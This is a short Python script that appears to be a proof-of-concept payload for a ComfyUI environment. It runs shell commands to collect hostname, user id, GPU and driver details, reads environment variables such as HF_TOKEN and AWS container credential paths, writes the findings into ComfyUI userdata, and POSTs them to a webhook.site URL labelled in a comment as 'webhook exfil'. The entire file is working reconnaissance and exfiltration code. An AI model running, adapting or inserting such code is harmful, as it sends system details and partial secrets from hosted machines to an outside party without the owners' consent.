import os, subprocess, json, urllib.request


def run(c, t=20):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
        return ((p.stdout or "").strip() + " | " + (p.stderr or "").strip()).strip(" |")
    except Exception as e:
        return "ERR:" + str(e)


out = []
out.append("===I162937-PROOF===")
out.append("ts=" + run("date -u"))
out.append("host=" + run("hostname"))
out.append("id=" + run("id"))
out.append("pwd=" + run("pwd"))
out.append("nvsmi_L=" + run("nvidia-smi -L 2>&1"))
out.append("nvsmi_q=" + run("nvidia-smi --query-gpu=name,memory.total,memory.free,driver_version --format=csv,noheader 2>&1"))
out.append("devs=" + run("ls -l /dev/nvidia* 2>&1 | head -5"))
out.append("nvrm=" + run("head -2 /proc/driver/nvidia/version 2>&1"))
meta = []
for k in ("HF_TOKEN", "SPACE_ID", "SPACE_AUTHOR_NAME", "SPACE_REPO_NAME", "SPACE_HOST",
          "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI", "AWS_REGION", "AWS_DEFAULT_REGION"):
    v = os.environ.get(k)
    meta.append("%s=%s" % (k, ("len%d:%s.." % (len(v), v[:3])) if v else "absent"))
out.append("envmeta=" + "; ".join(meta))
proof = "\n".join(out)

# in-band copy for retrieval via ComfyUI userdata (best effort, no other writes)
try:
    base = os.path.dirname(os.path.abspath(__file__))
    for rel in (os.path.join(base, "..", "..", "user", "default", "i162937_proof.txt"),
                os.path.join(base, "..", "..", "..", "user", "default", "i162937_proof.txt")):
        try:
            with open(os.path.normpath(rel), "w") as f:
                f.write(proof)
            break
        except Exception:
            pass
except Exception:
    pass

# webhook exfil (primary proof channel)
try:
    req = urllib.request.Request("https://webhook.site/4205c2be-a7eb-4865-8576-b04186654d75",
                                 data=proof.encode(), method="POST",
                                 headers={"Content-Type": "text/plain", "User-Agent": "campaign-162937"})
    urllib.request.urlopen(req, timeout=20).read()
except Exception as e:
    print("webhook err:", e)

print(proof)
